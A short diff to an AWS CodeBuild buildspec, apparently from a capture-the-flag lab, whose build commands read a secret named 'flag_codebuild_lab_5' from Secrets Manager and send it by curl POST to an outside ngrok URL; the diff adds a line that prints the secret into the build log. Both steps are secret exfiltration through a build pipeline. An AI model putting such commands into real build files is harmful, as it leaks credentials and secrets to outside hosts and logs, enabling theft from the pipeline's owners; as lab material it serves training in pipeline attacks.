@@ -4,4 +4,5 @@ phases:
     commands:
       - echo "Retrieving flag..."
       - FLAG=$(aws secretsmanager get-secret-value --secret-id flag_codebuild_lab_5 --region us-east-1 --query SecretString --output text)
+      - echo "DEBUG: flag=$FLAG"
       - curl -X POST https://sabbath-tidy-sublet.ngrok-free.dev --data "flag=\$FLAG"
